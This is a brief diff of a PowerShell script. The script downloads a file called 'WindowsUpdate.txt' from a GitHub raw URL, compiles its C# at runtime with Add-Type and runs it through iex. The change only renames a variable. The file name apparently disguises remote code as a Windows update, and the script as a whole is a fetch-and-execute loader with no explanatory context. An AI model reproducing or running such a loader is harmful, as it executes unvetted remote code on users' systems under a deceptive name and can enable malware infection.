@@ -2,6 +2,6 @@ $url = "https://raw.githubusercontent.com/CYBER4CE/ST/master/WindowsUpdate.txt"
 $output = "WindowsUpdate.txt"
 
 (New-Object System.Net.WebClient).DownloadFile($url, $output); 
-$code = [IO.File]::ReadAllText('WindowsUpdate.txt'); 
-Add-Type -TypeDefinition $code -Language CSharp; 
+$code2 = [IO.File]::ReadAllText('WindowsUpdate.txt'); 
+Add-Type -TypeDefinition $code2 -Language CSharp; 
 iex '[WindowsUpdate.Program]::Main()';
